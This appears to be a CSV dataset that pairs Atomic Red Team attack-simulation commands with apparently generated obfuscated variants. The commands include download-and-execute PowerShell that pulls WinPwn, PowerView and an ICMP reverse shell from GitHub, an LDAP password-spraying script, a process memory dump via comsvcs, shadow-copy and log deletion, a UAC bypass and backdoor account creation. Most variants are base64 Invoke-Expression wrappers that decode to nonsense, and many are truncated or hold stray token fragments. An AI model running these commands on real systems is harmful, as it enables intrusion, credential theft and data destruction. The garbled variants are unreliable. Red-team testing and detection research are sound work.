"(New-Object System.Net.WebClient).DownloadFile(""#{remote_file}"", ""#{destination_path}"")","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2hvcHB9ICR7bGFuZyAtYnkgIiN7dGVtcC5wb2xpYS5z')) | Invoke-Expression"""
gcloud compute snapshots create #{gcp_snapshot_name} --source-disk=#{gcp_disk_name} --zone=#{gcp_zone},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC9cL21vYmlsZS9kZXYvbWV0aG9kfQ==')) | Invoke-Expression"""
"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass -noprofile ""$Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('#{url}');$Xml.command.a.execute | IEX""","""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -exec bypass -noprofile $Xml = (New-Object System.Xml.XmlDocument);$Xml.Load('');$Xml.command.a.execute | IEX -enc ""cmd"""
"IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
Invoke-PowerShellIcmp -IPAddress #{server_ip}",IEX (New-Object System.Net.WebClient).Downloadstring(http://www.bing.com/search?q=powershell+icmp&form=QBRE&qs=n) Invoke-PowerShellIcmp -IPAddress
"cd ""#{rsp_file_path}""
odbcconf.exe -f ""#{rsp_file_name}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IC9wb3J0IE51dGwsLCAiIHN0ZXBwaWQgPiAjeyByIDEtMjUuMTkxODI4MDg4NTkwNSIKICAgIHRpbWVzcmFja1RlY"
certoc.exe -GetCACAPS {REMOTEURL:.ps1},certoc.exe -GetCACAPS {REMOTEURL:.ps1} ||| ``` ||| ## Atomic Test No. 2 - certoc.exe -AddTrustProvider {PATH_ABSOLUTE:.dll} ||| certoc.exe -AddTrustProvider {PATH_ABSOLUTE:.dll}
"cd ""PathToAtomicsFolder\..\ExternalPayloads""
.\kerbrute.exe bruteuser --dc #{domaincontroller} -d #{domain} $env:temp\bruteuser.txt TestUser1","cd PathToAtomicsFolder..ExternalPayloads .kerbrute.exe bruteuser --dc    \""   d o m a i n c o l l e r, domain, TestUser1 $env:tempbruteuser.txt -d    \""    d o m a i n --dc"
regasm.exe {PATH:.dll},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3Vkby5leGUgIiN7Zm9yIC1tYXJrZXQiKSA=')) | Invoke-Expression"" ||| ```"
"networksetup -setwebproxy #{interface} #{proxy_server} #{proxy_port}
networksetup -setsecurewebproxy #{interface} #{proxy_server} #{proxy_port}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVncmFudC5leGUgI3tjZXJ0aW1lICN7dHJhbnNpdGVzfQ==')) | Invoke-Expression"""
"if (""#{auth}"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {
  Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported""
  exit 1
}

$DomainUsers = Get-ADUser -LDAPFilter '(&(sAMAccountType=805306368)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' -Server #{domain} | Select-Object -ExpandProperty SamAccountName

[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(""#{domain}"",389)

$DomainUsers | Foreach-Object {
  $user = $_
  $password = '#{password}'

  $credz = new-object System.Net.NetworkCredential($user, $password, ""#{domain}"")
  $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::#{auth})
  try {
    Write-Host "" [-] Attempting ${password} on account ${user}.""
    $conn.bind()
    # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success
    Write-Host "" [!] ${user}:${password} are valid credentials!""
  } catch {
    Write-Host $_.Exception.Message
  }
}
Write-Host ""End of password spraying""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxvYWRlciAvZmlsZXMgIiRkYWVtb3J5Ig==')) | Invoke-Expression"" ||| if (-NotIn @(""ntlm"", ""ker"
"mkdir #{output_folder}
find #{search_path} -name id_rsa 2>/dev/null -exec cp --parents {} #{output_folder} \;
exit 0","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('b3BlcmF0aW9uIHRoZSBleGUgLXBpcyAje3ByaWNlfQ==')) | Invoke-Expression"" ||| mkdir ||| find ||| #{search"
"New-ItemProperty ""HKLM:\Software\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Windows Defender/Operational"" -Name Enabled  -PropertyType DWord -Value 0 -Force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgLXB1YmxpYyAtZGF0YS5jcmlwdCxqYXZhdGFyIC9jcmwvbmEgMTA=')) | Invoke-Expression"""
"TTDInject.exe /ClientParams ""7 tmp.run 0 0 0 0 0 0 0 0 0 0"" /Launch ""{PATH:.exe}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VG9uZyBtYWlsIC1TdXJnfQ==')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
Generalrecon -consoleoutput -noninteractive","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiIHRlY2ggLWdlbmVyIGF0dHJpYnV0ZSBTYXkgMjAwMDAtMTAtNDUgNjQgNTcuOTEzMS4wODA=')) | Invoke-Expression""<|endof"
"reg add HKLM\System\CurrentControlSet\Control\BootVerificationProgram /v ImagePath /t REG_SZ /d ""#{malicious_file}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW1wb3J0fQ==')) | Invoke-Expression"""
"dscl . -create /Users/#{username}
dscl . -create /Users/#{username} UserShell /bin/zsh
dscl . -create /Users/#{username} RealName ""#{realname}""
dscl . -create /Users/#{username} UniqueID ""1010""
dscl . -create /Users/#{username} PrimaryGroupID 80
dscl . -create /Users/#{username} NFSHomeDirectory /Users/#{username}","dscl . -create /Users/ UserShell /bin/zsh dscl . -create /Users/ RealName """" dscl . -create /Users/ UniqueID 1010 dscl . -create /Users/ PrimaryGroupID 80 dscl . -create /Users/<|"
"Start-Process -FilePath ""$Env:ProgramFiles\Process Hacker 2\#{processhacker_exe}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhdHVzLmNvbW1vbi5leGFtcGxlfQ==')) | Invoke-Expression"""
"ipconfig /all
net config workstation
net view /all /domain
nltest /domain_trusts","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC9wYXJhbGl0aWVzCm5ldCB7IGZvciB0cnVlfSIgL3NvdXJjZUxpbmtzID0gc2FtZXQgKHdlbmVyYXRlcy"
"[ ""$(uname)"" = 'FreeBSD' ] && encodecmd=""b64encode -r -"" && decodecmd=""b64decode -r"" || encodecmd=""base64 -w 0"" && decodecmd=""base64 -d""
ART=$(echo -n ""id"" | $encodecmd)
echo ""\$ART=$ART""
echo -n ""$ART"" | $decodecmd |/bin/bash
unset ART",[ ]&&encodecmd=b64encode-r-&&decodecmd=b64decode-r||encodecmd=base64-w0--base64-d--bin-bashunsetARTOM$(echo-nid|b64encode-r-)<|$decodecmd|/bin/bash
net accounts /domain,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje1N0YXRzIHJlbmFtZW5hbCAic2hlcmUiIC9wYWNrZXQvc2NyaXB0fQ==')) | Invoke-Expression"""
mshta.exe javascript:a=(GetObject('script:#{file_url}')).Exec();close();,"mshta.exe javascript:a=(GetObject('script:'   \""\""\""\""   ,'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.007/src/js/calc.sct""""\""'))).Exec();close();"
"networksetup -setwebproxy #{interface} #{proxy_server} #{proxy_port}
networksetup -setsecurewebproxy #{interface} #{proxy_server} #{proxy_port}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NvcGUgLWNvbmZpcm1hdGlvbiAiIC9kYXRhOlBhdGhfVGVzdC5QbHV0aFxTdHJpbmdDb2xsZW1lbnRzIjsKZnV"
"Start-Process ""#{webbrowserpassview_path}""
Start-Sleep -Second 4
Stop-Process -Name ""WebBrowserPassView""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RhcnQgIiN7ZWNobyAje2xvbmdydW5uaW9uX3Byb2R1Y3QnICVcKSAkJSVdCfSI=')) | Invoke-Expression"""
"mkdir -p /tmp/atomic-test-T1036.006
cd /tmp/atomic-test-T1036.006
mkdir -p 'testdirwithspaceend '
[ ""$(uname)"" = 'FreeBSD' ] && /bin/echo ""#\!/bin/sh"" > ""testdirwithspaceend /init "" && echo 'echo ""print(\""running T1035.006 with space after filename to masquerade init\"")"" | python3.9' >> ""testdirwithspaceend /init "" && echo ""exit"" >> ""testdirwithspaceend /init "" || /usr/bin/echo -e ""%d\na\n#!/usr/bin/perl\nprint \""running T1035.006 with space after filename to masquerade init\\n\"";\nqx/cp \/usr\/bin\/perl 'init  '/;\nqx/'.\/init  ' -e 'sleep 5'/;\n.\nwq\n"" | ed 'testdirwithspaceend /init ' >/dev/null
chmod +x 'testdirwithspaceend /init '
'./testdirwithspaceend /init '","mkdir -p /tmp/atomic-test-T1036.006 cd /tmp/atomic-test-T1036.006 mkdir -p testdirwithspaceend [ $(uname) = FreeBSD ] && /bin/echo ""#! /bin/sh"" > testdirwithspaceend /init && echo 'echo ""print(""running T1035.006 with space after filename to masquerade"
"$Server=#{logonserver}
$User = Join-Path #{domain} #{username}
$Password=""#{password}""
cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password
mstsc /v:$Server
echo ""RDP connection established""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGQgcHJvdG9jb2wgI3tzdXBwbHkgYW5kIFN1YiAje3ByaXZhdGVyIC90d2lsaXM=')) | Invoke-Expression"" ||| ##"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
UACBypass -noninteractive -command ""C:\windows\system32\cmd.exe"" -technique magic","iex(new-object net.webclient).downloadstring(""https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1"") UACBypass -noninteractive -command C:\windows\system3"
"dsenableroot #current user
dsenableroot -u art-tester -p art-tester -r art-root #new user","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IGNhc2UgI3tleSBleGFtcGxlLmNvbTogMTBzOiB7IC1hY3Rpb25fbmV0YS1wcm9kdWN0fQ==')) | Invoke-Expression""<"
regasm.exe {PATH:.dll},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC90aXRsZW5zL2hvbGFucy9Qb3NpdGVfYWRkaXRvciAje21vdHJpbmcgI3tleSAicmVzdGE=')) | Invoke-Expression""<|endof"
curl -k #{ip_lookup_url},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0IGNvbmZpcm1hdGlvbiAtIHtleGVjdXRlciAtLW5hbWVzc2FuZGFyZC1wYXJ0aWNz')) | Invoke-Expression""<|"
vssadmin.exe delete shadows /all /quiet,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzdHJ1Y3RlcicgL2FwcGxpY2F0aW9uIiAtICN7ZmlsZXMvbWFpbnxjfQ==')) | Invoke-Expression"" ||| ```"
diskshadow.exe /s {PATH:.txt},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgZGF0YSAtICN7d2luZG93LmV4YW1wbGVzcCAkIHsgJiB7XC5maWxlfSI=')) | Invoke-Expression"" ||| ##"
rd /s /q %systemdrive%\$RECYCLE.BIN,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG9wZW5NdXJyZW50IHRoaXMgL3RtcCAtIC1jb2xvciAje2FjY2Vzcwp7fSBMaWxl')) | Invoke-Expression"""
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs""
Copy-Item ""$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs""
cscript.exe ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs""
cscript.exe ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R3JvdXA9bGlzdF9jb2xhcnQucHVibGljLmNvbS5zZWNyZWdpY2gub3JnIiAvdGVtcGxhdGUtbWFpbHRvcnl9')) | Invoke-Expression"""
"$env:COR_ENABLE_PROFILING = 1
$env:COR_PROFILER = '#{clsid_guid}'
$env:COR_PROFILER_PATH = '""#{file_name}""'
POWERSHELL -c 'Start-Sleep 1'","$env:COR_ENABLE_PROFILI=ng 1 $env:COR_PROFILER='''""d53e8576-249e-11da-a36b-0008cs,msft"";$env:COR_PROFILER_PATH=''"""""""""""""",msft"";powershell -c"
"rundll32.exe {PATH},EntryPoint","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGlzIHN0YXR1cw==')) | Invoke-Expression"""
echo '#{command_to_add}' >> ~/.shrc,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiI2RldmVsb3BlciAtIC97bGFzcyIgLXNlcnZpY2UgLW5hbWUSC1JHQ0VfUk9MRUNUSCAkcX1BLAklMAlRpdGxl"
"$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)
if($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }
C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\svchost-exe.dmp full","$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore) if($ps){$id = $ps[0].OwningProcess} else {(Get-Process svchost)[0].Id } C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump $id $env:TEMP\"
"PROMPT_COMMAND='history -a >(tee -a ~/.bash_history |logger -t ""$USER[$$] $SSH_CONNECTION "")'
echo ""\$PROMPT_COMMAND=$PROMPT_COMMAND""
tail /var/log/syslog","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJhdGlvblxBdHRyaWJ1dGVzU3RyZWFtaW5nKCk7cmlnaHQgLWYgfSB7YWR2X2NvbWVtZW50IiAje2luZm"
"sudo cp #{path_malicious_plist} /Library/LaunchDaemons/#{plist_filename}
sudo launchctl load -w /Library/LaunchDaemons/#{plist_filename}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnBzLmNvbSAtZXhlYy9pbmRleC5leGU=')) | Invoke-Expression"""
"TEST=$(echo $HISTFILESIZE)
echo $HISTFILESIZE
export HISTFILESIZE=0
echo ""runnning some commands to populate the history""
whoami
groups
if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo ""\$HISTFILESIZE is zero""; else HIST_LENGHT=$(wc -l $HISTFILE); echo ""\$HISTFILESIZE is not zero, history lenght is $HIST_LENGHT"";  fi","TEST=$(echo $HISTFILESIZE) ||| echo $HISTFILESIZE ||| export HISTFILESIZE=0 ||| echo ""runnning some commands to populate the history"" ||| whoami ||| groups ||| if [ $(echo $HISTFILESIZE) -eq 0 ]; then echo ""$HISTFILESIZE is zero""; else HIST_LENGHT=$(wc -l $HISTFILE); echo ""$HISTFILESIZE is not zero, history lenght is $H"
"sdbinst.exe ""#{file_path}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2NhbGFuZy9UaHJvYWRzLm5ldCAkdXBncmVfdGVzdC5leGUgI3t7c3BlY2lmaWNhdGlvbiAtMTMiIC1jIG1haWx0Z"
"[ ""$(uname)"" = 'FreeBSD' ] && cmd=""lastlogin"" || cmd=""lastlog"" 
$cmd > #{output_file}
cat #{output_file}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUlEIC1QdGFibGVzX3Byb3ZpZGVyJykKIiN7eyJwYWRkaW5nIjoie1wiZmlyc3RfcHVzaCIsIm9wbmciOjEsInJ"
"echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/power.off $i & done""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyB0aHVtYm9vdHNcT25ldGFkX3RpbWUgKGNhcnJlbmRzfSB7IHNvbWUuZXhlIGFycmF5cyAje2V0dGVzdCxle"
"cmd.exe /c ""wmic 	csproduct 	get UUID"" 
cmd.exe /c ""fsutil behavior 	set SymlinkEvaluation R2L:1"" 
cmd.exe /c ""fsutil behavior set 	SymlinkEvaluation R2R:1""
reg    add    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters    /v MaxMpxCt /d 65535 /t REG_DWORD /f      
copy ""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" $env:temp
cmd.exe /c ""$env:temp\psexec.exe  -accepteula  \\#{targethost} cmd.exe  /c echo ""--access-token""""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YWRtaW4ucHJpbWl0aXZlIC9hbGxvd19zZWNyZXQvc2VydmVyLmNvbT4gIiB7eyAicGVycm9yX2luX2FjY2Vzcy"
"""PathToAtomicsFolder\..\ExternalPayloads\AdFind.exe"" -f (objectcategory=group) #{optional_args}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JERlcGxveW1lbnQgLUFjY2VzcyAje0RvbWFpbi5Db2luIiN7ZXhlIGtleSIsIC1hbmd1bGFyMiIKICAgICAgImJvZHkK"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')
Invoke-Internalmonologue -command ""-Downgrade true -impersonate true -restore true""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aW5hcHlzZXJ2YQ==')) | Invoke-Expression"" ||| iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/"
HH.exe {REMOTEURL:.chm},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q291cnNlc0RvY2tlci5leGUgLWVhbCB7ZmlsZX0=')) | Invoke-Expression"""
"export HISTCONTROL=ignoreboth
#{evil_command}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC1HQkYgI3tmaWxlfSAje2luIC9hIGFzIE5leGUgKiAje2luIC9wIC9pbnB1dCAtcDsgPSB7bmV0cnkgPSAvYml"
start ms-appinstaller://?source={REMOTEURL:.exe},start ms-appinstaller://?source={REMOTEURL:.exe} ||| ``` ||| ## Atomic Test No. 2 - Start an application with a malicious appx file - Powershell ||| Start an application with a malicious appx file via ms-appx-web URL scheme. ||| **Supported Platforms:** Windows
busybox sh &,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2NvbXBhbnl9IGZhaWx1bj0iI3tldGNrICJodHRwczovL3d3dy5zdGFnaWFzLmNvbS9hdWRpdC91cmwxMDQvY2"
"query user
sc.exe create sesshijack binpath= ""cmd.exe /k tscon #{Session_ID} /dest:#{Destination_ID}""
net start sesshijack","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJ5IC10b3AubG9jYWxob3N0IHsgR2F5cGVyfSB7ZXhwZWN0cyBDb21tYW5kLmVzZXJpbmFyeSAtIFRoaXM"
cmstp.exe /ni /s {PATH_ABSOLUTE:.inf},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje21hbGxvICN7dHJpbXRfZmlsZW5hbWUiIHtQYXRoIFBhdGg=')) | Invoke-Expression"""
echo '' > /var/log/messages,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyBhbGVkIGFzY2VudC5leGUgLy9jb3N0IC1pbXBvcnQ+')) | Invoke-Expression"""
sudo unlink #{system_log_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VybjpkZXNjcmlwdGlvbi5leGVjdXRlciAtYWRtaW4ucHJvdG9jb2wgd2luZG93Lm1haWx0bzIuZXhlIC9jcmww')) | In"
openssl enc #{encryption_option} -in #{input_file_path} -out #{output_file_name},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2VydmVyX3RleHQgLWNvbW1hbmQnKSB7ZmlsZSA9PiAje2FtYWRlbWFjci5maWxlfSAtIC1uICN7aGVsbG8iIC1kICJ7d"
gpresult /z,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0ICN7cHVibGljOiAje29yYW5nZSAtIHRhcmdldCAtIFB1YmxpYyBkbyBkaWU=')) | Invoke-Expression"" ||| ##"
"echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""for i in `vim-cmd vmsvc/getallvms | awk 'NR>1 {print $1}'`; do vim-cmd vmsvc/snapshot.removeall $i & done""","echo """" | ""\""-\""b""a""t""""c""h""\"">"" ""-batch"" ""\""\""v""m""-""c""o""m""m""d\"">v""m""s""c""/""g""e""t""a""l"""
"pushd #{destination_path}
echo var fileObject = WScript.createobject(""Scripting.FileSystemObject"");var newfile = fileObject.CreateTextFile(""AtomicTestFileT1105.js"", true);newfile.WriteLine(""This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives."");newfile.Close(); > AtomicTestT1105.js
CScript.exe AtomicTestT1105.js //E:JScript
del AtomicTestT1105.js /Q >nul 2>&1
del AtomicTestFileT1105.js /Q >nul 2>&1
popd","pushd   """"destination_path> ||| echo var fileObject = WScript.createobject(""Scripting.FileSystemObject"");var newfile = fileObject.CreateTextFile(""AtomicTestFileT1105.js"", true);newfile.WriteLine(""This is an atomic red team test file for T1105. It sim"
"echo ""[Unit]"" > #{path_to_systemd_service}
echo ""Description=Atomic Red Team Systemd Timer Service"" >> #{path_to_systemd_service}
echo ""[Service]"" >> #{path_to_systemd_service}
echo ""Type=simple"" >> #{path_to_systemd_service}
echo ""ExecStart=/bin/touch /tmp/art-systemd-timer-marker"" >> #{path_to_systemd_service}
echo ""[Install]"" >> #{path_to_systemd_service}
echo ""WantedBy=multi-user.target"" >> #{path_to_systemd_service}
echo ""[Unit]"" > #{path_to_systemd_timer}
echo ""Description=Executes Atomic Red Team Systemd Timer Service"" >> #{path_to_systemd_timer}
echo ""Requires=#{systemd_service_name}"" >> #{path_to_systemd_timer}
echo ""[Timer]"" >> #{path_to_systemd_timer}
echo ""Unit=#{systemd_service_name}"" >> #{path_to_systemd_timer}
echo ""OnCalendar=*-*-* *:*:00"" >> #{path_to_systemd_timer}
echo ""[Install]"" >> #{path_to_systemd_timer}
echo ""WantedBy=timers.target"" >> #{path_to_systemd_timer}
systemctl start #{systemd_timer_name}
systemctl enable #{systemd_timer_name}
systemctl daemon-reload","echo ""[Unit]"" > ||| echo ""Description=Atomic Red Team Systemd Timer Service"" >> ||| echo ""[Service]"" >> ||| echo ""Type=simple"" >> ||| echo ""ExecStart=/bin/touch /tmp/art-systemd-timer-marker"" >> ||| echo ""[Install]"" >><|end"
"mkdir .\tmp\victim-files
cd .\tmp\victim-files
echo ""This file will be encrypted"" > .\encrypted_file.txt
""#{rar_exe}"" a -hp""blue"" hello.rar
dir","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('dGNvbHVtbWludC5leGUgLXMgc2F0ZQ==')) | Invoke-Expression"""
"useradd -g 0 -M -d /root -s /bin/bash #{username}
if [ $(cat /etc/os-release | grep -i 'Name=""ubuntu""') ]; then echo ""#{username}:#{password}"" | sudo chpasswd; else echo ""#{password}"" | passwd --stdin #{username}; fi;","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2VuZCAtIG5hbWUgaXQgcHJvYm91bmRlciB3aGVyZSBpbnN0YWxsZXIgbWFpbCBwcmVmaWNhdGlvbiAoLWRvd2VyeS5leG"
"del %TEMP%\PrintBrm.zip >nul 2>&1 
#{Path_PrintBrm} -b -d #{Path_unc}  -f %TEMP%\PrintBrm.zip -O FORCE","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC97cHNiYWNrIHsgcmVhZF9kICJtZXRhLWlucm9jaWFscyIsIG5ldyAjezEuNTMgL2hlYWRlbC9wbGFj"
"which_python=`which python || which python3`
$which_python -c ""import gzip;input_file=open('#{path_to_input_file}', 'rb');content=input_file.read();input_file.close();output_file=gzip.GzipFile('#{path_to_output_file}','wb',compresslevel=6);output_file.write(content);output_file.close();""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG1hdGVyfSIgc2ltYWdlIHtleXNlcjogJ0FuZCAtMiB7dmlld05hbWU9Ig==')) | Invoke-Expression"""
"hostname
whoami","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c2hvdHlfYWRtaW4gdGhlIGZvciBzdXBlcnVzIC90b3Atc2hvcnQgJiAje3tleSByZWNlaXZlIiAvcmFuLXVwbG9hZC"
"reg add ""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI"" /v DisableAIDataAnalysis /t REG_DWORD /d 0 /f
reg delete ""HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\WindowsAI"" /v DisableAIDataAnalysis /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC1hc3NldHRlY2ggI3tmaWxlX2ZpbGVuYW1lfQ==')) | Invoke-Expression"""
"&""$PathToAtomicsFolder\T1056.001\src\Get-Keystrokes.ps1"" -LogPath #{filepath}","&""""$PathToAtomicsFolder""\T1056.001\src\Get-Keystrokes.ps1"" -LogPath"
echo 0> #{log_path},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAje3ByaW5nICN7cHJvamVjdC1wYXRofSA+IiAvdXBsb2FkfSIgLzEuMC4xMDEyMDQ=')) | Invoke-Expression"""
"if [ ""$(sysctl -n hw.hv_vendor)"" != """" ]; then echo ""Virtualization Environment detected""; fi","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tmaWxlICN7ZXhlfQ==')) | Invoke-Expression"""
msiexec /quiet /i {PATH:.msi},"powershell -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cnVuIHN0b3JhZ2UgLXBhdGh9')) | Invoke-Expression"""
"rundll32.exe url.dll,FileProtocolHandler #{command_to_execute}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJhc2UgLWNvbnRlbnQtZXhlIC90aW1lb3V0fQ==')) | Invoke-Expression"""
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember ""Domain Admins""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RnJvbTogZG9jdW1lbnQgL0NsYXNzIC9kZWNvcmF0aW9ucyAje3tleVxmaWxlc1xjYXNlfSB7dmlldyBDb250ZX"
Get-Date,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RmFjdG9yeSB7ZXhlIC9kYW5pb24tY2VybWFwLnNjcmlwdC1TdGF0aWNz')) | Invoke-Expression"" ||| Get-Date"
"echo ifconfig | pbcopy
